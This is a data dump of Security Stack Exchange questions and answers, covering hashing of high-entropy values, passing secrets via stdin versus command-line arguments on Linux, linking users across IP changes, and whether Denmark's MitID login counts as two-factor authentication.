<p>The reasoning behind this being OK is quite simple. Passwords get extra hashing because they're somewhat predictable; while in <em>theory</em> a reasonable-length password could be hundreds of bits of entropy, in practice it's more like dozens. Making the password hashing a million times as expensive is, in terms of the difficulty of brute-forcing the hash, like making the password have another 20 bits of entropy. BUT: that's still only going to get you from maybe 40ish bits of entropy (if it's a quite good password; less if it isn't) to the equivalent cost of 60ish bits. That's still over a quintillion times less work than trying to brute-force a 128-bit value. Similarly, passwords get salted so that they'll have unique hashes and you can't precompute them, but all that the salt is doing is adding some amount - typically 64-128 bits - of entropy to the password (and then storing that extra entropy in plain text, so it doesn't actually make brute-forcing any harder). A high-entropy (128+ bits of entropy) value <em>already has more entropy</em> than a typical password + a 64 (or plausibly even a 96) bit salt; collisions are just not going to happen, and precomputing is literally impossible because there isn't enough storage on the planet to hold the table, nor enough compute on the planet to generate it.</p>
","1"
"258911","258911","Is it really safe to pass sensitive data to another script via stdin, compared to passing via arguments (Linux)","<p>Yes, the transfer to the script via arguments is visible through <code>ps -ax</code>, <code>/proc/&lt;pid&gt;/cmdline</code> etc., BUT if someone has already gained access to your account from the outside (e.g. by hacking your browser) he will have no trouble looking not only <code>ps -ax</code>, but also periodically intercept <code>/proc/&lt;pid&gt;/fd/0</code> (once intercepted, second skipped, to be less suspicious).</p>
<p>But this is nothing, because if an intruder got access to your account, it will not be difficult for him to just run keylogger (to listen to x11 server) and intercept keystrokes.</p>
<p>I am currently writing a script that runs through sudo (root) and accepts sensitive data. When sending them directly (as arguments) to a script, I can hard restrict the characters used in the arguments with sudo (<code>user ALL = (root) NOPASSWD: /bin/program [0-9][0-9a-z][0-9a-z]...</code>) so that an attacker cannot use special character combinations to bypass the restriction and thus gain root access.</p>
<p>When getting data through the pipe (stdin), I will also of course filter data:</p>
<pre><code>#!/bin/sh
pass=$(dd if=/dev/stdin bs=1 count=10 2&gt;/dev/null | tr -cd [:alnum:])
</code></pre>
<p>, but I consider simple rules of restriction of arguments through sudo safer (also in the script itself there will be additional checking).</p>
<p>So is there a fundamental difference between passing through stdin or arguments?</p>
","18","5","258912","<p><code>/proc/&lt;pid&gt;/fd/0</code> can only be read by the process owner and root. <code>/proc/&lt;pid&gt;/cmdline</code> can be read by all users.</p>
","61"
"258911","258911","Is it really safe to pass sensitive data to another script via stdin, compared to passing via arguments (Linux)","<p>Yes, the transfer to the script via arguments is visible through <code>ps -ax</code>, <code>/proc/&lt;pid&gt;/cmdline</code> etc., BUT if someone has already gained access to your account from the outside (e.g. by hacking your browser) he will have no trouble looking not only <code>ps -ax</code>, but also periodically intercept <code>/proc/&lt;pid&gt;/fd/0</code> (once intercepted, second skipped, to be less suspicious).</p>
<p>But this is nothing, because if an intruder got access to your account, it will not be difficult for him to just run keylogger (to listen to x11 server) and intercept keystrokes.</p>
<p>I am currently writing a script that runs through sudo (root) and accepts sensitive data. When sending them directly (as arguments) to a script, I can hard restrict the characters used in the arguments with sudo (<code>user ALL = (root) NOPASSWD: /bin/program [0-9][0-9a-z][0-9a-z]...</code>) so that an attacker cannot use special character combinations to bypass the restriction and thus gain root access.</p>
<p>When getting data through the pipe (stdin), I will also of course filter data:</p>
<pre><code>#!/bin/sh
pass=$(dd if=/dev/stdin bs=1 count=10 2&gt;/dev/null | tr -cd [:alnum:])
</code></pre>
<p>, but I consider simple rules of restriction of arguments through sudo safer (also in the script itself there will be additional checking).</p>
<p>So is there a fundamental difference between passing through stdin or arguments?</p>
","18","5","258914","<p>In addition to the different permissions needed for a process' command line vs its pipes, consider:</p>
<p>Command lines often show up in audit logs, shell history, or similar; data passed to stdin does not.</p>
<p>Command lines are visible at any time from when the program starts to when it stops (which can be a very long time) even if nothing logs the command line or holds a reference to the process. Data in stdin (and other pipes) is ephemeral; if you want to intercept it, you need to do so at the right time (after writing and before reading).</p>
","43"
"258911","258911","Is it really safe to pass sensitive data to another script via stdin, compared to passing via arguments (Linux)","<p>Yes, the transfer to the script via arguments is visible through <code>ps -ax</code>, <code>/proc/&lt;pid&gt;/cmdline</code> etc., BUT if someone has already gained access to your account from the outside (e.g. by hacking your browser) he will have no trouble looking not only <code>ps -ax</code>, but also periodically intercept <code>/proc/&lt;pid&gt;/fd/0</code> (once intercepted, second skipped, to be less suspicious).</p>
<p>But this is nothing, because if an intruder got access to your account, it will not be difficult for him to just run keylogger (to listen to x11 server) and intercept keystrokes.</p>
<p>I am currently writing a script that runs through sudo (root) and accepts sensitive data. When sending them directly (as arguments) to a script, I can hard restrict the characters used in the arguments with sudo (<code>user ALL = (root) NOPASSWD: /bin/program [0-9][0-9a-z][0-9a-z]...</code>) so that an attacker cannot use special character combinations to bypass the restriction and thus gain root access.</p>
<p>When getting data through the pipe (stdin), I will also of course filter data:</p>
<pre><code>#!/bin/sh
pass=$(dd if=/dev/stdin bs=1 count=10 2&gt;/dev/null | tr -cd [:alnum:])
</code></pre>
<p>, but I consider simple rules of restriction of arguments through sudo safer (also in the script itself there will be additional checking).</p>
<p>So is there a fundamental difference between passing through stdin or arguments?</p>
","18","5","258926","<p>The important part is not about an attacker compromising exactly <em>your</em> account.</p>
<p>Any account on a typical Linux system can run <code>ps</code> and see what others are running.</p>
<p>Even if your particular machine is personal and has a single (human) user, a typical modern Linux system has ~25 accounts created for internal use (just look in your <code>/etc/passwd</code>).</p>
<p>They exist for a reason - to limit the damage if some subsystem is compromised.</p>
<p>By exposing important information to these accounts, you effectively bypass this mechanism.</p>
","19"
"258911","258911","Is it really safe to pass sensitive data to another script via stdin, compared to passing via arguments (Linux)","<p>Yes, the transfer to the script via arguments is visible through <code>ps -ax</code>, <code>/proc/&lt;pid&gt;/cmdline</code> etc., BUT if someone has already gained access to your account from the outside (e.g. by hacking your browser) he will have no trouble looking not only <code>ps -ax</code>, but also periodically intercept <code>/proc/&lt;pid&gt;/fd/0</code> (once intercepted, second skipped, to be less suspicious).</p>
<p>But this is nothing, because if an intruder got access to your account, it will not be difficult for him to just run keylogger (to listen to x11 server) and intercept keystrokes.</p>
<p>I am currently writing a script that runs through sudo (root) and accepts sensitive data. When sending them directly (as arguments) to a script, I can hard restrict the characters used in the arguments with sudo (<code>user ALL = (root) NOPASSWD: /bin/program [0-9][0-9a-z][0-9a-z]...</code>) so that an attacker cannot use special character combinations to bypass the restriction and thus gain root access.</p>
<p>When getting data through the pipe (stdin), I will also of course filter data:</p>
<pre><code>#!/bin/sh
pass=$(dd if=/dev/stdin bs=1 count=10 2&gt;/dev/null | tr -cd [:alnum:])
</code></pre>
<p>, but I consider simple rules of restriction of arguments through sudo safer (also in the script itself there will be additional checking).</p>
<p>So is there a fundamental difference between passing through stdin or arguments?</p>
","18","5","258932","<p>I think the title to your question and the body of your question are contradicting each other a bit and I think that may be leading to some of the confusion with the other correct answers.</p>
<p>Your title says &quot;Is it really safe&quot; but in the body of your request you're comparing passing data via stdin vs command line arguments. When you compare two things the result of the comparison only speaks to the comparison and never allows you to make an absolute claim outside of the comparison itself. For example: The number 10 is more than the number 5. So 10 is &quot;bigger&quot; than 5. But is 10 a &quot;big&quot; number when there are obviously much bigger numbers? I can't justify saying &quot;10 is a big number&quot; just because it's bigger than some other number.</p>
<p>So: &quot;is it safe?&quot; is one question, but your question is really implying: &quot;Is it safer?&quot; with an emphasis on the extra &quot;r&quot; on &quot;safer&quot;.</p>
<p>Just like it doesn't make sense to say that 10 is a big number when there are always bigger numbers: Nothing in information security is ever 100% &quot;safe&quot;. As you point out there are attack vectors that could allow an attacker to get at data passed via stdin. The point is that there are FAR fewer attack vectors that allow an attacker to get access to data passed via stdin. AND those vectors are more difficult to achieve.</p>
<p>As the other answers point out: Data passed via command line arguments are visible for a long time. They are very often logged into log files as well as history files like .bash_history. These log files and history files can get backed up to the cloud, copied to other folders, disks, etc. This data is also visible to other system accounts which could potentially be compromised. In other words: An attacker has a lot of available attack vectors to gain access to command line argument data. And because of how long this data remains around for viewing, the attacker also has a larger window of time for which he can utilize to execute these attacks and still access the command line data.</p>
<p>With stdin there are not only fewer vectors: But the attacker also has a limited time window to execute a successful attack here. He has to compromise your account specifically, or root. Both of which are more difficult than compromising one of the system accounts.  Then assuming he pulls off a successful attack to compromise your account or root: Now he can only see data being passed to stdin in real time. He can't go back and look in bash_history or log files to see data from stdin.</p>
<p>Between the lower number of attack vectors and the timing issue: It's obvious that passing data via stdin is SAFER. And that's what matters: It's not possible for something to be 100% foolproof/safe. Everything in security is about choosing the safest possible option which minimizes the number of attack vectors or exposed &quot;surface area&quot; of points that can potentially be attacked and lead to a system becoming compromised.</p>
<p>So: TL;DR: No, stdin is not 100% safe as nothing is. But it's far SAFER than command line arguments which is why it's preferred over using command line arguments to pass sensitive data like passwords.</p>
","9"
"258911","258911","Is it really safe to pass sensitive data to another script via stdin, compared to passing via arguments (Linux)","<p>Yes, the transfer to the script via arguments is visible through <code>ps -ax</code>, <code>/proc/&lt;pid&gt;/cmdline</code> etc., BUT if someone has already gained access to your account from the outside (e.g. by hacking your browser) he will have no trouble looking not only <code>ps -ax</code>, but also periodically intercept <code>/proc/&lt;pid&gt;/fd/0</code> (once intercepted, second skipped, to be less suspicious).</p>
<p>But this is nothing, because if an intruder got access to your account, it will not be difficult for him to just run keylogger (to listen to x11 server) and intercept keystrokes.</p>
<p>I am currently writing a script that runs through sudo (root) and accepts sensitive data. When sending them directly (as arguments) to a script, I can hard restrict the characters used in the arguments with sudo (<code>user ALL = (root) NOPASSWD: /bin/program [0-9][0-9a-z][0-9a-z]...</code>) so that an attacker cannot use special character combinations to bypass the restriction and thus gain root access.</p>
<p>When getting data through the pipe (stdin), I will also of course filter data:</p>
<pre><code>#!/bin/sh
pass=$(dd if=/dev/stdin bs=1 count=10 2&gt;/dev/null | tr -cd [:alnum:])
</code></pre>
<p>, but I consider simple rules of restriction of arguments through sudo safer (also in the script itself there will be additional checking).</p>
<p>So is there a fundamental difference between passing through stdin or arguments?</p>
","18","5","258937","<p>No. Nothing you do with a computer is 100% safe, and nothing in life is 100% safe. That's the wrong way to look at it. The question you should be asking is, which option offers <em>more</em> safety? When planning how to secure your system, you want to follow a <em><a href=""https://en.wikipedia.org/wiki/Defense_in_depth_(computing)"" rel=""nofollow noreferrer"">defense in depth</a></em> model: At every point while designing or configuring your system, you want to ask the question, which choice would improve my security?</p>
<p>Is passing sensitive data via stdin safer than passing it through the command line? Yes, for all the reasons <a href=""https://security.stackexchange.com/a/258914/88532"">CBHacking</a> mentioned: stdin is ephemeral and requires greater <a href=""https://en.wikipedia.org/wiki/Privilege_escalation"" rel=""nofollow noreferrer"">privilege escalation</a> to access.</p>
<p>Can someone who has gained access to the root account (or the account running the script) via privilege escalation intercept the data sent to stdin?</p>
<p>Absolutely. However, the command line arguments are accessible to <em>any</em> user account on your system for as long as the program is running, meaning that an attacker can choose which account they want to target, and has more opportunities to witness the sensitive data on the system.</p>
<p>If you give the attacker a choice, you should assume they will attack the most vulnerable account available, which will probably be one that you never thought to protect.</p>
<p>Using stdin to pass the data is not completely secure, and so that isn't the last step you should take to secure your system, if you're concerned about it. However, it is more safe than passing sensitive data on the command line.</p>
","4"
"258900","258900","Privacy - If I get a new IP from my ISP (home network), can websites infer the new IP is me?","<p>Let's say I am a member of a website. I always sign in from computer A, which is not linked at all with computer B, and I have always signed in from my home network.</p>
<p>Now let's say my ISP releases the old IP, and I'm given a new one (still using the same modem and plan). I do NOT sign in or connect to any servers associated with the website on computer A after this change occurs. And now I want to become a member on computer B, which has never visited any website or been linked with computer A in any way.</p>
<p>Is there a way that the website could know that the new IP is connected to the old one? Does the IP being under the same subnet or ASN affect this? How, and why?</p>
","1","3","258902","<p>You don't explicitly say so, but I assume you're not going to sign in with your old account from B, and that you'll use a new email address, etc. when you create a new account.</p>
<hr />
<p>Short of compromising the ISP, or you copying data (e.g. transferring cookies) from A to B, not reliably. IP addresses are given out over moderately large geographic areas (ever seen a GeoIP service think you're a couple cities over from where you are? That's the level of resolution they have) and all IPs within that pool are interchangeable as far as an outsider is concerned.</p>
<p>It might be able to <em>guess</em> based on any number of signals (e.g. if you use the same browser on the same OS with the same extensions installed on both A and B, browser fingerprinting can do a surprisingly decent job of matching and if there's not a lot of people running that particular configuration it might be literally unique on that site to just your two machines) but it wouldn't be possible for the site to confidently assert that it's the same user.</p>
","0"
"258900","258900","Privacy - If I get a new IP from my ISP (home network), can websites infer the new IP is me?","<p>Let's say I am a member of a website. I always sign in from computer A, which is not linked at all with computer B, and I have always signed in from my home network.</p>
<p>Now let's say my ISP releases the old IP, and I'm given a new one (still using the same modem and plan). I do NOT sign in or connect to any servers associated with the website on computer A after this change occurs. And now I want to become a member on computer B, which has never visited any website or been linked with computer A in any way.</p>
<p>Is there a way that the website could know that the new IP is connected to the old one? Does the IP being under the same subnet or ASN affect this? How, and why?</p>
","1","3","258908","<p>Ooh! This is a tough question!</p>
<p>In short, yes inferring a connection is possible even if the IP address and computer change.</p>
<p>Let's dig into it a bit. Any number of clues can be used to infer a connection. With your description, we have already ruled out some of the more obvious clues like static IP, session cookies, web side-channel analysis, cached canaries, etc. Since you specifically stated ASN is in-bounds, let's start there.</p>
<p>The ASN for the IP issued by your ISP may change when you are issued a new IP, but that is unlikely for most ISPs. Regardless of if your ASN changes, the organization will not (unless you switch ISPs). The network size described by your ASN is very relevant. If you have a small ISP with a /23 then the pool of potential humans behind the IP is in the hundreds. A larger ISP with multiple /12 has a pool in the millions.</p>
<p>Reverse DNS could be a factor. Some ISPs issue DHCP leases from IP address pools pre-configured with reverse DNS local to a specific neighbourhood.</p>
<p>GeoIP, as others have mentioned, may be off by a couple cities. But it could be accurate to the neighbourhood. It depends on your IP block and which GeoIP database you look it up in. The free/public databases are rarely as good as certain paid services.</p>
<p>Keyboard layout and typing profiles can be identified by the timing of keypresses when entering your username/password or filling out account registration forms. <a href=""https://scholar.google.com/scholar?q=timing%20analysis%20of%20keystrokes"" rel=""nofollow noreferrer"">Timing analysis of keystrokes</a> can even guess what is being typed by measuring the delay between key presses. If the analysis is being performed by the site that you are entering data into, then they already know what keys are being pressed and that makes for an even more solid digital fingerprint of typing style.</p>
<p>What are your scrolling habits? What parts of the site are you more likely to peruse? What advertisements catch your eye? How long does it take you to click on a thing you are interested in? What times of day, or days of the week are you on the site? It sounds absurd and creepy that anyone would pay attention to this information but this is exactly the kind of data collected by online advertisers. And yes, a website can track mouse movement with javascript which optionally feeds the data back to the site. Not only can sites tell what you click on and when, but they can capture the shape of the path your mouse takes when moving from one link or button to another.</p>
<p>So far, we have considered some passive information gathering methods. There are active methods too. OS and browser specific exploits can be used to compromise computer B. From there, options spiral in dizzying directions. Enabling a camera or microphone, scanning the internal network for computer A, or scanning for another device that was also known to computer A, just to name a few. To the potential extreme of mapping out component serial numbers and stumbling across sequential serials between computer A and B. Memory modules, hard drives, mother boards and dozens of other chips inside the average computer all have unique identifiers.</p>
<p>In this hypothetical scenario, the breadcrumbs that a hypothetical investigator may determine conclusive are darn near impossible to predict. But the landscape of potential breadcrumbs in a digital world is vast. To be clear, any active information gathering takes far more effort than is financially viable for a small organization en-mass. There is also significant risk involved. So if you aren't carrying around nation-state secrets or the formula for WD-40, then this is just a thought experiment. And chances are, nobody will guess that you are the same person who already registered a free trial on some &quot;cat picture&quot; website.</p>
<p>Certainty is not required to infer a correlation.</p>
","1"
"258900","258900","Privacy - If I get a new IP from my ISP (home network), can websites infer the new IP is me?","<p>Let's say I am a member of a website. I always sign in from computer A, which is not linked at all with computer B, and I have always signed in from my home network.</p>
<p>Now let's say my ISP releases the old IP, and I'm given a new one (still using the same modem and plan). I do NOT sign in or connect to any servers associated with the website on computer A after this change occurs. And now I want to become a member on computer B, which has never visited any website or been linked with computer A in any way.</p>
<p>Is there a way that the website could know that the new IP is connected to the old one? Does the IP being under the same subnet or ASN affect this? How, and why?</p>
","1","3","258919","<p>As said by @Kenny</p>
<blockquote>
<p>Certainty is not required to infer a correlation.</p>
</blockquote>
<p>First of all, it depends on the nature of the website you're attending.
Say it's a casual Internet forum: it's likely that nobody is spending their time scrubbing the logs, unless they need to perform ad hoc investigations in order to unmask duplicate accounts, nasty trolls or cyberbullies. Unless you are drawing attention to yourself, you would probably pass undetected. Because nobody is <strong>proactively</strong> looking for duplicate accounts.</p>
<p>Second, it depends on the <strong>data retention</strong> policies of the website in questions. The webserver logs are typically archived/pruned after a few weeks. On the other hand the forum software may record the IP address for every post in the database. So it means that your former self from computer A still has <strong>history</strong>, and that history can be <strong>mined</strong> for possible relationships.
If you can identify the software used on the website, then you can find out by yourself what kind of data is available to the website operators.</p>
<p>Some websites do active auti-fraud screening, this is certainly true for the marketplaces and E-commerce sites. They look at the patterns, which means that a lot of factors are aggregated to find correlations, not just the IP address.</p>
<p>Say that you are a customer of a small regional ISP, that we call Acme Internet Services of Arizona (AISA). It happens that you are the only one member of that website using AISA. Even if your IP address changes, you still stand out from the crowd because you are a relative anomaly in the &quot;dataset&quot;.</p>
<p>This is probably the most crucial factor.</p>
<p>And then there is personal <strong>engagement</strong>. What is your daily interaction with the website ? Back to the forum example: dupes are betrayed by their writing style, expressions, arguing tactics. The more content you post, the more data to compare and analyze. Some people try to hide but like a leopard they cannot change their spots :)</p>
","1"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258858","<p>Usernames are not meant to be a secret, and as you show, they can be enumerated. In MFA, you are <em>authenticating</em> as that user. So, the username can't be a factor.</p>
<p>By dropping the password and relying on a 2FA <em><strong>app</strong></em>, the 2FA code becomes a single factor. So, they are using 2FA <em><strong>tools</strong></em> to implement a <em><strong>single factor</strong></em>. The secret to open the app (i.e. &quot;the code to open it&quot;) does not authenticate the user, it unlocks the app. It would be similar to the PIN for the phone itself. So, no, the app password is not in the same scope for user authentication in the <em>remote</em> system.</p>
<p>This is what happens when developers/designers work with the acronyms of things and forget what the acronyms mean.</p>
<p>&quot;Have we implemented 2FA?&quot; <br>
<em>Checks design and sees a 2FA app</em><br>
&quot;Yep!&quot;<br></p>
<p>Unless the app is somehow restricted, a 2FA authenticator app is simply a TOTP calculator.  It stores a secret and the code is proof that the device knows the secret. The code is not a secret itself. So a TOTP 2FA app is a single factor unless there are details to the situation that you have not provided.</p>
<p>So, no, a non-secret username and a TOTP app is just a single factor.</p>
","16"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258860","<p>Can you guarantee that the person using the 2FA application is using a password, passcode, or other method to unlock either their phone or their authenticator app? Unless you are working in an organization with specific device policies and are sure that people are using their organization-managed device for their 2FA application, you can't.</p>
<p>Can you guarantee that someone would reasonable keep a username a secret? It's relatively common knowledge that passwords are meant to be secrets, even though not everyone treats them this way or creates and protects them in a secure way. User names, on the other hand, are not commonly considered to be secrets. Treating user names like passwords (especially in the example where you can find out what user names exist) doesn't make much sense from an experience perspective.</p>
<p>Since you cannot generally enforce that a 2FA app requires a password to get to, I don't think that it's reasonable to say that the 2FA app itself is both &quot;something you have&quot; and &quot;something you know&quot;. It can only be safely assumed to be &quot;something you have&quot;.</p>
<p>In theory, I suppose that the &quot;secret username&quot; could be the &quot;something that you know&quot;, but the specific example of unique usernames and the ability to find a username makes that much weaker.</p>
<p>The only case where this makes sense is if your application (or authentication system, if you're using SSO for multiple applications) requires a specific 2FA app that requires a secure password to see the codes. In this case, the only difference is where the work happens. However, I'd want to understand more about how the system links 2FA codes with usernames to see if there are weaknesses there.</p>
","4"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258865","<p>Correct me if I'm wrong (the source docs, as you say, are in Danish), but this is how it seems.  Start by asking what I need, to access a resource protected with this system, that is otherwise too well protected to gain unauthorised access, I get the following:</p>
<ul>
<li><p>I need a <strong>username</strong>. This is what you enter as an identity, so it can't also be an authenticating factor for that identity. The part you write about how <code>The username is treated essentially like a password in terms of &quot;should not be known by anyone</code> is essentially either no security, or security by obscurity. Either way as they basically admit, its <strong>not a factor</strong>.</p>
</li>
<li><p>I need the authenticator app. Well, everyone can get the app, right? They didn't create a novel app just for you alone. At best the app has individualised output, so if two people ran it, same moment, same login, they'd still get different unrelated outputs (a bit like individual one time encryption data created at download for every user of the app). At that point, assuming sensible use of hashing or similar, someone would need the version of the app, or app setup data, that you have. That might count as &quot;something you have&quot;. But I don't see anything so far that says that's how it is. Sounds like the app is same for everyone, in which case <strong>not a factor</strong>.  But I could be mistaken.</p>
</li>
<li><p>I need to login to the authenticator app, using a passcode or face ID, and it then gives me a one time login approval for the resource. We need to know how that login is generated, exactly, because right now I don't see a thing that stops me running the same app on an emulator, tracing where it checks the face ID or passcode is right or wrong, and bypassing the resulting branch. In which case, <strong>not a factor</strong>. (Remember, the client software is in the hands of the enemy, so they can do anything with it that they like, that's technically possible...)  If the app uses (e.g. hashes or whatever) the original face ID or passcode <strong>to create the login code</strong>, then I can't use the app without that data, and it counts as <strong>one factor</strong>, which could be something  you have (face-&gt; digital biometric data) or something you know (passcode). If it checks the face ID or passcode internal against some expected data, and that check.isn't done against some hashed value or similar, then I can bypass that check or use the check data myself without a problem.</p>
</li>
</ul>
<p>In short, without knowing Danish, its hard to go far into this. My questions would be:</p>
<ul>
<li>Is the app or its setup data the same or different per user?</li>
<li>How are your face ID/passcode, and (if its done this way) any individualised app setup data, used, to generate the authentication code?</li>
</ul>
<p>If you update the OP with that, I can update this answer. But right now, doesn't sound very much like great security. Sounds like &quot;security designed by non security people&quot;. Could be wrong though.</p>
","2"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258871","<p>As far as I am familiar with similar schemes the argument is <strong>not</strong> that the username is a factor (it's the identity), but the claimed two factors would be:</p>
<ul>
<li>The device you have generates a unique code when you install the app and goes through some type of more robust authentication system (e.g. a similar Dutch scheme<sup>1</sup> will sent you both an SMS <strong>and</strong> an email <strong>and</strong> require you to know your postcode (in NL, 1 postcode = 1 specific street), and if any fail you have to wait for a physical letter to arrive in your mailbox). This is one factor.</li>
<li>And then you have the passcode, which is <strong>not</strong> verified or stored on your device, so your device doesn't know the correct passcode. This is the other factor. (Note: The usage of biometric 'security' solutions typically takes this factor away by storing the passcode in a slightly less insecure location in the device, trusting the device to only give it when certain biometric authentication passes. <strong>This is always less secure</strong>. For example my banking app makes this very explicit).</li>
</ul>
<p>So when you enter your passcode your device is sending some derivative of both (1) the secret stored on your phone and (2) the secret stored in your head. Next it is checked whether there is a corresponding login request for the matching username (which is typically not stored on the device, thus significantly lowering the danger of the device being stolen) and if there is the app offers you to approve the request.</p>
<p>In conclusion: If you do not use biometric security then I think calling this two factor authentication is fair. The biggest irritation for me with this system is that it only allows for numeric (short) passcodes rather than proper passwords, which in my opinion is just stupid and greatly reduces the overall security. And as passcode systems make the use of password managers harder it also means that more people reuse their passcodes. But if they would replace the passcode with a password it could be a pretty decent system overall.</p>
<p>Of course it's also worth noting that there is no guarantee that any specific system that tries to implement this implements it correctly. I would recommend to any architect to just use an off the shelf solution, but I do appreciate the advantages that this approach bring (governments have to spend a lot of effort ensuring their solutions are simple enough for literally everyone).</p>
<p><sup>1</sup> The last time I interacted with this is years ago. I definitely remember going through this multi step process, but I also remember the first time around having to wait for a letter. I am unsure by this point how the 'robust authentication' process works exactly, but I am confident in the overall concept (robust authentication makes your version of the app unique).</p>
","12"
